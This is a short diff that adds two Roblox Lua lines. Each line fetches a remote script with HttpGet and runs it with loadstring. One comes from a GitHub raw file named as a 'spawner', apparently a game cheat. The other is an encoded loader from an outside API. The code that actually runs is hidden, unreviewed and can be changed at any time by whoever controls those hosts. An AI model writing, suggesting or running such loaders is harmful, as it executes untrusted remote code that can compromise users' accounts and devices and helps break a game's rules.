@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripteredwinter/scripts/refs/heads/main/gag2spawner"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImI4NWUwNWFkLTY1MjQtNDhmYy05NDI5LTJmMTg0NDdmNTQyNiIsImtpbmQiOiJsb2FkZXIifQ"))()
